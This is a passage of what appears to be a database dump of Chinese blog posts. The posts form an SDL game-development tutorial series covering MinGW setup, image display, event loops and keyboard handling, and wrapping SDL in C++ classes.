class=\"language-bash\">MINGW_HOME=C:\\MinGW\r\nC_INCLUDE_PATH=%MINGW_HOME%\\include;\r\nCPLUS_INCLUDE_PATH=%MINGW_HOME%\\lib\\gcc\\i686-w64-mingw32\\4.8.1;%MINGW_HOME%\\lib\\gcc\\i686-w64-mingw32\\4.8.1\\include;%MINGW_HOME%\\lib\\gcc\\i686-w64-mingw32\\4.8.1\\include\\c++;%MINGW_HOME%\\lib\\gcc\\i686-w64-mingw32\\4.8.1\\include\\c++\\backward;%MINGW_HOME%\\include;\r\nLIBRARY_PATH=%MINGW_HOME%\\lib;\r\nPATH=%MINGW_HOME%\\bin;%MINGW_HOME%\\i686-w64-mingw32\\lib;%PATH%;</code></pre>\r\n\r\n<p>需要把mingw32的开发环境下载安装。 mingw32-get</p>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:12px\">如果安装autotools时不用gcc</span><br />\r\n<span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:12px\">cc相当于gcc的链接</span><br />\r\n<br />\r\n<strong><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:12px\">notepadplus下编译命令</span></strong><br />\r\n<br />\r\n<span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:12px\">cc -o $(NAME_PART).exe $(FILE_NAME) -Wall&nbsp;&nbsp; -lmingw32&nbsp; -lSDLmain&nbsp; -lSDL&nbsp; -lSDL_image&nbsp;&nbsp; -mwindows&nbsp; -lgcc&nbsp; -fstack-check=no</span><br />\r\n<br />\r\n<span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:12px\">运行命令：</span><br />\r\n<span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:12px\">$(CURRENT_DIRECTORY)/$(NAME_PART).exe</span><br />\r\n<br />\r\n<span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:12px\">开发过程中sdl_image</span><br />\r\n<span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:12px\">请使用x86里的</span><br />\r\n<span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:12px\">把SDL_image-devel-1.2.12-VC (1).zip\\SDL_image-1.2.12\\lib\\x86下的所有文件复制到C:\\MinGW\\lib</span></p>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">测试代码（请在该目录放一个tt.png图片，随便。 自己网上找了）：</span></p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">#include&lt;stdio.h&gt;\r\n#include \"SDL/SDL.h\"\r\n#include \"SDL/SDL_image.h\"\r\nSDL_Surface *screen;\r\n\r\n\r\nvoid video_init(){  //游戏图形模式初始化\r\n	if(SDL_Init(SDL_INIT_VIDEO)){\r\n		fprintf(stderr,\"Can\'t init SDL:%s\\n\",SDL_GetError());\r\n		exit(1);\r\n	}\r\n	screen=SDL_SetVideoMode(640,480,16,SDL_SWSURFACE);\r\n	if(screen==NULL){\r\n		fprintf(stderr,\"Can\'t set mode 640x480:%s\\n\",SDL_GetError());\r\n		exit(1);\r\n	}\r\n	atexit(SDL_Quit);\r\n	SDL_ShowCursor(0);//关闭鼠标显示\r\n}\r\n\r\nSDL_Surface *loadIMG(const char *fileName){\r\n	SDL_Surface *img;\r\n	img = IMG_Load(fileName);\r\n	if(img == NULL)  \r\n    {  \r\n        fprintf(stderr,\"Could not load %s: %s\",fileName,SDL_GetError());  \r\n        exit(1);  \r\n    }  \r\n    return img;  \r\n}\r\n\r\nSDL_Surface *loadBMP(char *fileName)            //加载bmp图片  \r\n{  \r\n    SDL_Surface *bmp;  \r\n    bmp = SDL_LoadBMP(fileName);  \r\n    if(bmp == NULL)  \r\n    {  \r\n        fprintf(stderr,\"Could not load %s: %s\",fileName,SDL_GetError());  \r\n        exit(1);  \r\n    }  \r\n    return bmp;  \r\n}  \r\n\r\nint main(int argc, char* argv[]){\r\n	if(SDL_Init(SDL_INIT_EVERYTHING)==-1){\r\n		printf(\"error..\\n\");\r\n	}else{\r\n		printf(\"ok\\n\");\r\n		\r\n		video_init();\r\n		\r\n		SDL_Surface *img;\r\n		img=loadIMG(\"tt.png\");\r\n			\r\n		while (1){\r\n			// Poll for events, and handle the ones we care about.\r\n			SDL_Rect dest;\r\n			dest.x=100;\r\n			dest.y=100;\r\n			dest.w=200;\r\n			dest.h=200;\r\n			\r\n			SDL_Color color;\r\n			color.r=255;\r\n			color.g=0;\r\n			color.b=0;\r\n\r\n			\r\n			SDL_FillRect(screen, &amp;screen-&gt;clip_rect, SDL_MapRGB(screen-&gt;format,0xFF,0xFF,0xFF));\r\n			SDL_FillRect(screen, &amp;dest, SDL_MapRGB(screen-&gt;format,0,0,0xFF));\r\n			\r\n			dest.x=200;\r\n			dest.y=200;\r\n			dest.w=200;\r\n			dest.h=200;\r\n			SDL_BlitSurface(img, &amp;screen-&gt;clip_rect, screen,&amp;dest);\r\n\r\n			\r\n			SDL_Flip(screen);\r\n			SDL_Event event;\r\n			while (SDL_PollEvent(&amp;event)){\r\n				if(event.type==SDL_KEYDOWN){\r\n					int key = event.key.keysym.sym;\r\n					printf(\"%d\\n\",key);\r\n					if(key==SDLK_ESCAPE){\r\n						printf(\"%d\\n\",1000);\r\n						SDL_Quit();\r\n						exit(1);\r\n					}else if(key==SDLK_UP){\r\n						printf(\"up\\n\");\r\n					}else if(key==SDLK_DOWN){\r\n						printf(\"down\\n\");\r\n					}else if(key==SDLK_LEFT){\r\n						printf(\"left\\n\");\r\n					}else if(key==SDLK_RIGHT){\r\n						printf(\"right\\n\");\r\n					}\r\n				}else if(event.type==SDL_QUIT){\r\n					printf(\"%d\\n\",1000);\r\n					SDL_Quit();\r\n					exit(1);\r\n				}\r\n			}\r\n		}\r\n		\r\n		\r\n	}\r\n	\r\n	return 0;\r\n}\r\n</code></pre>\r\n\r\n<p>&nbsp;</p>\r\n',0,0,'SDL游戏开发教程01（环境准备 mingw+notepadplus）',109,NULL,0),(19,0,'20150613215332',2,'<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp; &nbsp;&nbsp;</span><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:small\">显示图片是2D游戏开发的基础，游戏开发的大部分工作是在处理用户的输入，然后调整显示在界面上的图片。这个例子就是完成最基本的功能：显示图片。由于没有消息循环和事件响应，窗口不能移动，只能用任务管理器关闭。</span></p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">#include \"SDL/SDL.h\"\r\n#include &lt;string&gt;\r\n\r\nconst int SCREEN_WIDTH = 800;\r\nconst int SCREEN_HEIGHT = 600;\r\nconst int SCREEN_BPP = 32;\r\n\r\n\r\n//从硬盘中加载一张图片\r\nSDL_Surface *load_image( std::string filename )\r\n{\r\n	SDL_Surface* loadedImage = NULL;\r\n	SDL_Surface* optimizedImage = NULL;\r\n	\r\n	//加载硬盘中的图片，SDL_LoadBMP函数只支持BMP格式图片\r\n	loadedImage = SDL_LoadBMP( filename.c_str() );\r\n	\r\n	//如果图片加载成功\r\n	if( loadedImage != NULL )\r\n	{\r\n		//根据当前程序的设置，将图片信息转换成适合程序使用的格式，转换后会得到一张新图片\r\n		//比如说程序里面用的是32位色，而图片本来是16位色，则需要将图片转换成32位色后才能在窗口中正常显示\r\n		optimizedImage = SDL_DisplayFormat( loadedImage );\r\n		\r\n		//释放刚刚从硬盘加载的图片，加载的图片一定要注意释放，否则会造成内存泄漏\r\n		SDL_FreeSurface( loadedImage );\r\n	}\r\n\r\n	return optimizedImage;\r\n}\r\n\r\n//将源图片粘贴到目的图片上，即将内存中的一块区域覆盖到另一块区域上\r\nvoid apply_surface( int x, int y, SDL_Surface* source, SDL_Surface* destination )\r\n{\r\n	//源图片将要粘贴的位置，这个位置指目的区域上的位置\r\n	//SDL的坐标原点在左上角，向右为X正方向，向下为Y正方向\r\n	SDL_Rect offset;\r\n	offset.x = x;\r\n	offset.y = y;\r\n	\r\n	//第二个参数表示将源图片的哪部分粘贴过去，如果为NULL，表示全部\r\n	//如果部分粘贴，则在第二个参数中指明取源图片的哪部分\r\n	SDL_BlitSurface( source, NULL, destination, &amp;offset);\r\n}\r\n\r\n\r\n\r\nint main( int argc, char* args[] )\r\n{\r\n	SDL_Surface *message = NULL;\r\n	SDL_Surface *screen = NULL;\r\n\r\n	/**\r\n	 * 初始化SDL环境，具体参数见SDL文档，这里初始化所有环境\r\n	 * 初始化所有环境的好处是开始时所有的环境都帮你初始化好，后面就不用担心相应的环境是否被初始化\r\n	 * 但缺点是有些SDL的功能你可能用不着，在这里把他初始化后会造成资源浪费\r\n	 * 由于是学习，所以为了方便，初始化所有环境\r\n	 */\r\n	if( SDL_Init( SDL_INIT_EVERYTHING ) == -1 )\r\n	{\r\n		return 1;\r\n	}\r\n	\r\n	/**设置程序窗口属性，该函数会根据传入的参数创建窗口，返回一个screen\r\n	 * screen可以看成和窗口对应的一块内存区域，程序在这块内存区域中粘贴图片，做变换\r\n	 * 最后再将这块区域的数据贴到屏幕上去，这样就得到了游戏中的一幅画面，即一帧\r\n	 * SCREEN_WIDTH 	窗口宽\r\n	 * SCREEN_HEIGHT	窗口高\r\n	 * SCREEN_BPP		存储一个像素用的位数，就是我们平时配置显示器时的\"颜色质量\"，这里用32位\r\n	 * SDL_SWSURFACE	该参数可以配置是否全屏、窗口内容存储位置之类的东西，详细信息见SDL文档，这里设置为非全屏且窗口内容存储在内存中\r\n	 */\r\n	screen = SDL_SetVideoMode( SCREEN_WIDTH, SCREEN_HEIGHT, SCREEN_BPP, SDL_SWSURFACE );\r\n	if( screen == NULL )\r\n	{\r\n		return 1;\r\n	}\r\n	\r\n	//设置窗口标题和图标，这里暂时不设置图标\r\n	SDL_WM_SetCaption( \"Hello World\", NULL );\r\n	\r\n	//加载要显示的图片，这里可以换成你想要显示的任何图片，不过只能是BMP格式的\r\n	message = load_image( \"E:\\\\code_picture\\\\javaeye.bmp\" );\r\n\r\n	//将要显示的图片粘贴到screen上的左上角去\r\n	apply_surface( 0, 0, message, screen );\r\n\r\n	//上面在screen上做的所有操作都是在内存中进行，下面是将screen内存中的内容贴到屏幕窗口中\r\n	if( SDL_Flip( screen ) == -1 )\r\n	{\r\n		return 1;\r\n	}\r\n\r\n	//等待两秒，免得main函数马上运行完并退出，造成什么都看不到，你可以根据实际情况适当延长时间\r\n	SDL_Delay( 2000 );\r\n	\r\n	//释放加载的图片\r\n	SDL_FreeSurface( message );\r\n	\r\n	//释放窗口\r\n	SDL_FreeSurface( screen );\r\n	\r\n	//退出SDL环境\r\n	SDL_Quit();\r\n\r\n	return 0;\r\n}</code></pre>\r\n\r\n<p>&nbsp; &nbsp;&nbsp;<span style=\"font-size:small\">上面的代码主要参考http://lazyfoo.net/SDL_tutorials/index.php&nbsp;，只对其中的部分代码做了小小调整，如果看上面的注释没办法明白什么意思的话，可以参考这个链接里面的介绍。</span><br />\r\n<span style=\"font-size:small\">&nbsp;&nbsp; &nbsp; 如果你选择的图片大于窗口大小的话，将显示部分图片；如果选择的图片小于窗口大小的话，图片没有覆盖到的部分将显示黑色，这是因为screen被创建后默认是黑色。在后面的教程中，将会介绍到图片的缩放，由于图片缩放会造成图片的失真，所以尽量不要使用该功能。</span></p>\r\n',0,0,'SDL游戏开发教程02（显示图片）',70,NULL,0),(20,0,'20150613215614',2,'<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;&nbsp;</span><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:small\">对于窗口程序来说，消息循环和事件响应是非常重要的，这节将介绍如何利用SDL提供的API函数实现消息循环和键盘ESC键响应。<br />\r\n将上节中的这部分代码注释掉：</span></p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">//if( SDL_Flip( screen ) == -1 )\r\n//{\r\n//	return 1;\r\n//}\r\n//SDL_Delay( 2000 );</code></pre>\r\n\r\n<p><span style=\"font-size:small\">上面的代码主要是将内存中的内容显示到屏幕上，然后等待两秒，让用户有机会看到图片。</span></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><span style=\"font-size:small\">&nbsp;&nbsp;&nbsp; 下面要将这部分带代码替换成一个消息循环，让程序可以响应用户消息，代码如下：</span></p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">bool bQuit = false;		//程序是否退出的标志\r\nSDL_Event event;\r\nwhile(!bQuit)			//如果bQuit不为true的话，循环一直进行\r\n{\r\n	//从消息循环中尝试取出一个消息，如果有的话返回ture，否则返回false\r\n	//SDL_PollEvent不会等待，而是立刻返回\r\n	while( SDL_PollEvent( &amp;event ) )\r\n	{\r\n		switch(event.type)		//处理取到的消息，判断消息类型\r\n		{\r\n		case SDL_KEYDOWN:		//如果是键盘按下事件\r\n			if(event.key.keysym.sym == SDLK_ESCAPE)	//如果按的是ESC键\r\n			{\r\n				bQuit = true;						//退出循环\r\n			}\r\n			break;\r\n		case SDL_QUIT:			//如果是窗口关闭事件，例如点击窗口的关闭按钮\r\n			bQuit = true;							//退出循环\r\n			break;\r\n		default:\r\n			break;\r\n		}\r\n	}\r\n\r\n	//将内存中的内容显示到屏幕上，该函数每调用一次就会更新一次窗口的内容，即游戏中的一帧\r\n	//由于在这个循环中我们没有修改内存中的内容，所以屏幕窗口中显示的内容不会发生变化\r\n	if( SDL_Flip( screen ) == -1 )\r\n	{\r\n		break;\r\n	}\r\n}\r\n</code></pre>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:small\">&nbsp; 学过windwos API编程的人一定对上面的这段代码非常熟悉，因为它和windows的消息循环机制很相似，对于windows的消息循环来说我们一般这样写：</span></p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">MSG msg;\r\nwhile(GetMessage(&amp;msg,NULL,0,0))\r\n{\r\n	TranslateMessage(&amp;msg);\r\n	DispatchMessage(&amp;msg);\r\n}</code></pre>\r\n\r\n<p><span style=\"font-size:small\">在这里windows和SDL消息循环的区别在于GetMessage在消息队列中没有消息的情况下会等待，直到有消息为止；而SDL_PollEvent是不管有没有消息都马上返回。</span></p>\r\n\r\n<p><span style=\"font-size:small\">&nbsp;&nbsp;&nbsp; 其实在windows api中也有与SDL的SDL_PollEvent对应的函数，那就是PeekMessage。同样在SDL中也有与GetMessage对于的SDL_WaitEvent函数。</span></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;<span style=\"font-size:small\">&nbsp;在这里，我们为什么用SDL_PollEvent而不用SDL_WaitEvent？是因为SDL_WaitEvent在没有用户消息的时候会造成程序等待，从而影响到游戏的帧数，这样在有动画的游戏中，就会出现用户不操作的时候界面停止，当用户再次操作时，界面发生跳跃的情况。试想玩俄罗斯方块的时候，你操作一下它就动一下，你不操作他就不动；或者刚刚方块还在上面，你等了一下没操作键盘，等你再操作键盘的时候，方块已经到下面了，这个是因为方块的下落一般是在定时器中处理的，是后台处理，没有用户消息的时候，后台的定时器还在运行，但界面没有和后台同步，从而造成画面跳跃前进的状况。</span></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"font-size:small\">对于消息处理来说，SDL还提供了一些函数，由于我们暂时对消息处理没有进一步更深的需求，所以在这里不详细介绍，等用到的时候再说。如果你想了解一下的话，可以阅读SDL的文档。</span></p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">typedef union SDL_Event \r\n{\r\n	Uint8 type;					//消息类型\r\n	SDL_ActiveEvent active;		//窗口焦点、输入焦点及鼠标焦点的失去和得到消息\r\n	SDL_KeyboardEvent key;		//键盘消息，键盘按下和释放\r\n	SDL_MouseMotionEvent motion;//鼠标移动消息\r\n	SDL_MouseButtonEvent button;//鼠标按键消息\r\n	SDL_JoyAxisEvent jaxis;		//手柄消息\r\n	SDL_JoyBallEvent jball; 	//手柄消息\r\n	SDL_JoyHatEvent jhat; 		//手柄消息\r\n	SDL_JoyButtonEvent jbutton; //手柄消息\r\n	SDL_ResizeEvent resize;		//窗口大小变化事件\r\n	SDL_ExposeEvent expose;		//窗口重绘消息\r\n	SDL_QuitEvent quit;			//退出消息\r\n	SDL_UserEvent user;			//用户自定义事件\r\n	SDL_SysWMEvent syswm;		//平台相关的系统消息\r\n} SDL_Event;</code></pre>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;&nbsp;</span><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:small\">SDL_Event是一个联合体，type字段决定了其中的哪个结构体数据有效。&nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; 本节中只用到了键盘消息，所以这里主要介绍键盘消息，如果后面用到了其他消息，将做详细解释。SDL_KeyboardEvent定义：</span></p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">typedef struct\r\n{\r\n  Uint8 type;			//消息类型，&lt;tt class=\"LITERAL\"&gt;SDL_KEYDOWN/UP&lt;/tt&gt;\r\n\r\n\r\n  Uint8 state;			//键盘状态，表示按下还是释放，在这里和type字段代表的意义相同\r\n  SDL_keysym keysym;	//具体的按键信息\r\n} SDL_KeyboardEvent;</code></pre>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:small\">&nbsp;这里是键盘消息结构体的定义，type表示类型，由于SDL_Event是联合体，所以SDL_KeyboardEvent中的type等于SDL_Event中的type字段。下面看SDL_keysym：</span></p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">typedef struct\r\n{\r\n  Uint8 scancode;	//按键对应的硬件扫描码\r\n  SDLKey sym;		//按键对应的SDL枚举定义，SDL定义的键盘键以SDLK_开头（如SDLK_DELETE表示删除键）\r\n  SDLMod mod;		//哪个辅助键被按下，辅助键指ALT,SHIFT之类的键\r\n  Uint16 unicode;	//输入对应的unicode编码（需要调用SDL_EnableUNICODE开启unicode，SDL默认不开启）\r\n} SDL_keysym;</code></pre>\r\n\r\n<p><span style=\"font-size:small\">&nbsp; &nbsp; 其中scancode 暂时用不着，判断哪个键被按下一般都是用sym ，SDLKey和SDLMod都是SDL定义的枚举，在头文件SDL_keysym.h中。具体的可参考SDL文档或者源代码。</span></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"font-size:small\">到这里为止，我们可以在窗口中显示一张图片，并且可以移动和关闭窗口了，在这过程中用到的函数的具体相关细节，需要大家自己去尝试，去了解，这里只是介绍了一些常用的功能。下一节中将介绍如何用C++将这些代码封装起来。</span></p>\r\n',0,0,'SDL游戏开发教程03（消息循环和键盘事件响应）',62,NULL,0),(21,0,'20150613220055',2,'<p>&nbsp; &nbsp; 前面的章节介绍了一个简单窗口的开发，这节将介绍如何把前面用到的东西用C++封装起来。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 为什么用C++封装起来：</p>\r\n\r\n<p>1、C语言没有异常机制，每次调用一个函数都需要通过检查返回值来判断是否成功，比较麻烦。</p>\r\n\r\n<p>2、对我个人而言，开发效率上C++要优于C语言，并且C++的代码要容易组织管理，写出来的代码也更容易理解。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 封装的主要部分：</p>\r\n\r\n<p>1、将所有的SDL函数都用类包装起来，对于需要做返回值判断的函数，在包装的地方进行判断，然后决定是否抛出异常。这样对于调用者来说就不需要再做返回值判断了。</p>\r\n\r\n<p>2、新建一个SDL类。该类用到了单例模式和工厂模式, 提供了访问所有SDL函数的入口。</p>\r\n\r\n<p>3、将创建窗口和消息循环这部分代码封装成一个框架类，以后写代码时只要继承这个框架就可以了。</p>\r\n\r\n<p>4、包装SDL_Surface结构体，使它可以像普通对象一样使用。因为通过SDL API获取一个SDL_Surface后需要要手动释放，否则会造成内存泄漏。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 封装之后的main函数：</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">#include &lt;string&gt;\r\n#include \"lessons/Lesson01.h\"\r\nint main( int argc, char* args[] )\r\n{\r\n	Lesson01 frame;\r\n\r\n	frame.setSize(800, 600);		//设置窗口大小\r\n	frame.setTitle(\"Lesson01\");		//设置标题\r\n\r\n	frame.open();					//打开窗口并开始循环\r\n\r\n	return 0;\r\n}</code></pre>\r\n\r\n<p>&nbsp;封装成这样子之后，我们可以将不同课程中的例子代码写在不同的类中，完全隔离开，到时候想运行哪一课的例子修改一下main中的Lesson01就可以了。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 下面根据这份代码逐步介绍封装过程。上面main函数中用到了Lesson01类，下面先看看Lesson01里面有些什么东西。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; Lesson01.h</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">#ifndef LESSON01_H_\r\n#define LESSON01_H_\r\n#include \"../SDLFrame.h\"\r\nclass Lesson01 : public SDLFrame\r\n{\r\npublic:\r\n	Lesson01();\r\n	virtual ~Lesson01();\r\nprotected:\r\n	void onRender();	//渲染窗口\r\n	void onInit();		//初始化\r\npublic:\r\n	SDLSurfacePtr message;	//界面要显示的图片\r\n};\r\n\r\n#endif /* LESSON01_H_ */</code></pre>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;Lesson01.cpp</span></p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">#include \"Lesson01.h\"\r\n\r\nLesson01::Lesson01()\r\n{\r\n	// TODO Auto-generated constructor stub\r\n\r\n}\r\n\r\nLesson01::~Lesson01()\r\n{\r\n	// TODO Auto-generated destructor stub\r\n}\r\n\r\nvoid Lesson01::onRender()\r\n{\r\n	//将图片填充到screen\r\n	SDL::video()-&gt;BlitSurface(message, NULL, screen, NULL);\r\n}\r\nvoid Lesson01::onInit()\r\n{\r\n	//加载图片\r\n	SDLSurfacePtr loadedImage = SDL::video()-&gt;LoadBMP(\"E:\\\\code_picture\\\\javaeye.bmp\");\r\n	\r\n	//将图片转换成适合程序的格式\r\n	message = SDL::video()-&gt;DisplayFormat(loadedImage);\r\n}</code></pre>\r\n\r\n<p>&nbsp; &nbsp;这里可以看出Lesson01是继承自SDLFrame，而它本身只有两个函数，OnInit负责一些初始化工作，OnRender负责将要显示的内容填充到screen中去。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; Lesson01.cpp中用到了SDL::video()，这就是前面提到的SDL类，该类提供了所有SDL函数的入口，这里的SDL::video()-&gt;BlitSurface等于SDL_BlitSurface,只是包装了一下而以。</p>\r\n\r\n<p>下面看SDL类</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 头文件</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">#ifndef SDLCORE_H_\r\n#define SDLCORE_H_\r\n#include \"SDLException.h\"\r\n#include \"SDLVideo.h\"\r\n#include \"SDLWindow.h\"\r\n#include \"SDLEvent.h\"\r\n\r\nclass SDL\r\n{\r\npublic:\r\n	SDL();\r\n	virtual ~SDL();\r\npublic:\r\n	static void Init(Uint32 flags);		//初始化SDL环境，见SDL.h中以SDL_INIT_开头的宏定义\r\n	static void Quit();					//退出SDL环境\r\npublic:\r\n	static SDLVideo * video();			//SDLVideo封装了video相关的函数\r\n	static SDLWindow * window();		//SDLWindow封装了窗口相关的函数\r\n	static SDLEvent * event();			//SDLEvent封装了event相关的函数\r\n};\r\n\r\n#endif /* SDLCORE_H_ */</code></pre>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">CPP文件</span></p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">#include \"SDLCore.h\"\r\n\r\nSDL::SDL()\r\n{\r\n	// TODO Auto-generated constructor stub\r\n\r\n}\r\n\r\nSDL::~SDL()\r\n{\r\n	// TODO Auto-generated destructor stub\r\n}\r\n\r\nvoid SDL::Init(Uint32 flags)\r\n{\r\n	int ret =  SDL_Init(flags);\r\n	if(ret == -1)\r\n	{\r\n		throw SDLException(std::string(\"初始化SDL错误：\") + SDL_GetError());\r\n	}\r\n}\r\nvoid SDL::Quit()\r\n{\r\n	SDL_Quit();\r\n}\r\n\r\nSDLVideo * SDL::video()\r\n{\r\n	static SDLVideo video;\r\n	return &amp;video;\r\n}\r\n\r\nSDLWindow * SDL::window()\r\n{\r\n	static SDLWindow window;\r\n	return &amp;window;\r\n}\r\n\r\nSDLEvent * SDL::event()\r\n{\r\n	static SDLEvent event;\r\n	return &amp;event;\r\n}\r\n</code></pre>\r\n\r\n<p>&nbsp;从上面的代码可以看出，SDL类只负责初始化和退出SDL环境，同时创建SDL相关的封装类对象，这里用到了C++静态成员变量的特性：全局生命周期且只被初始化一次。从而保证SDLVideo、SDLWindow、SDLEvent的对象全局唯一。</p>\r\n\r\n<p>&nbsp;&nbsp; SDLException是程序定义的一个异常类，由于很普通，所以在这里不再进行解释。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp; SDLVideo、SDLWindow、SDLEvent都是SDL API函数的封装类，原理几乎是一样的，这里取其中的一个进行分析。</p>\r\n\r\n<p>SDLVideo.h</p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">#ifndef SDLVIDEO_H_\r\n#define SDLVIDEO_H_\r\n#include \"SDLException.h\"\r\n#include \"SDL/SDL.h\"\r\n#include \"SDLSurface.h\"\r\n\r\nclass SDLVideo\r\n{\r\n	friend class SDL;\r\n\r\n\r\nprivate:\r\n	SDLVideo();\r\npublic:\r\n	virtual ~SDLVideo();\r\npublic:\r\n	/**\r\n	 * 设置窗口模式\r\n	 * width	宽\r\n	 * height	高\r\n	 * bpp		颜色位数\r\n	 * flags	SDL.h中以SDL_INIT_开头的宏定义\r\n	 * return	窗口对应的内存块\r\n	 */\r\n	SDLSurfacePtr SetVideoMode(int width, int height, int bpp, Uint32 flags);\r\n\r\n	/*\r\n	 * 将内存中的内容显示到屏幕上\r\n	 * screen	内存块\r\n	 */\r\n	void Flip(SDLSurfacePtr screen);\r\n\r\n	/**\r\n	 * 将图片转换成程序需要的格式（源图片和转换后的图片在不同的内存中）\r\n	 * surface	源图片\r\n	 * return	转换后的图片\r\n	 */\r\n	SDLSurfacePtr DisplayFormat(SDLSurfacePtr surface);\r\n\r\n	/*\r\n	 * 将硬盘上的图片加载到内存中（只支持BMP格式）\r\n	 * file		图片文件路径\r\n	 * return	加载后内存中的图片区域\r\n	 */\r\n	SDLSurfacePtr	LoadBMP(std::string file);\r\n\r\n	/**\r\n	 * 将源图片覆盖到目的图片区域上\r\n	 * src		源图片\r\n	 * srcrect	将要覆盖过去的源图片区域，NULL表示全部\r\n	 * dst		目的图片\r\n	 * dstrect	源图片要覆盖到目的图片的哪个地方，NULL表示左上角\r\n	 */\r\n	void BlitSurface(SDLSurfacePtr src, SDL_Rect *srcrect, SDLSurfacePtr dst, SDL_Rect *dstrect);\r\n};\r\n\r\n#endif /* SDLVIDEO_H_ */</code></pre>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">SDLVideo.cpp</span></p>\r\n\r\n<pre>\r\n<code class=\"language-cpp\">#include \"SDLVideo.h\"\r\n\r\nSDLVideo::SDLVideo() {\r\n	// TODO Auto-generated constructor stub\r\n\r\n}\r\n\r\nSDLVideo::~SDLVideo() {\r\n	// TODO Auto-generated destructor stub\r\n}\r\n\r\nSDLSurfacePtr SDLVideo::SetVideoMode(int width, int height, int bpp, Uint32 flags)\r\n{\r\n	SDL_Surface * surface = SDL_SetVideoMode(width, height, bpp, flags);\r\n	if(NULL == surface)\r\n	{\r\n		throw SDLException(std::string(\"SDL_SetVideoMode初始化视频模式时发生错误：\") + SDL_GetError());\r\n	}\r\n\r\n	return SDLSurfacePtr(new SDLSurface(surface));\r\n}\r\n\r\nvoid SDLVideo::Flip(SDLSurfacePtr screen)\r\n{\r\n	int ret = SDL_Flip(screen-&gt;value());\r\n	if(ret == -1)\r\n	{\r\n		throw SDLException(std::string(\"SDL_Flip内存内容显示到屏幕时发生错误：\") + SDL_GetError());\r\n	}\r\n}\r\n\r\nSDLSurfacePtr SDLVideo::DisplayFormat(SDLSurfacePtr surface)\r\n{\r\n	SDL_Surface *newSurface = SDL_DisplayFormat(surface-&gt;value());\r\n	if(NULL == newSurface)\r\n	{\r\n		throw SDLException(std::string(\"SDL_DisplayFormat转换图片格式为程序格式时发生错误：\") + SDL_GetError());\r\n	}\r\n\r\n	return SDLSurfacePtr(new SDLSurface(newSurface));\r\n}\r\n\r\nSDLSurfacePtr	SDLVideo::LoadBMP(std::string file)\r\n{\r\n	SDL_Surface *surface = SDL_LoadBMP(file.c_str());\r\n	if(NULL == surface)\r\n	{\r\n		throw SDLException(std::string(\"SDL_LoadBMP加载BMP图片时发生错误：\") + SDL_GetError());\r\n	}\r\n\r\n	return SDLSurfacePtr(new SDLSurface(surface));\r\n}\r\n\r\nvoid SDLVideo::BlitSurface(SDLSurfacePtr src, SDL_Rect *srcrect, SDLSurfacePtr dst, SDL_Rect *dstrect)\r\n{\r\n	int ret = 